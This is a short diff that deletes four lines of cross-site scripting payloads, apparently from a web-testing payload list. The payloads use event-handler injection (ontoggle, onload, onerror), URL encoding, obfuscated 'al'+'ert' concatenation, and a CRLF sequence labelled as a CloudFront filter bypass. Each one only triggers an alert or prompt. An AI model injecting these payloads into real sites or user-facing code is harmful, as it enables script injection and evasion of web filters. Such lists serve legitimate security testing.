@@ -1,4 +1,0 @@
-">'><details/open/ontoggle=confirm('XSS')>  
-6'%22()%26%25%22%3E%3Csvg/onload=prompt(1)%3E/  
-';window/*aabb*/['al'%2b'ert'] document./*aabb*/location);//  
-">%0D%0A%0D%0A<x '="foo"><x foo='><img src=x onerror=javascript:alert(cloudfrontbypass)//'>
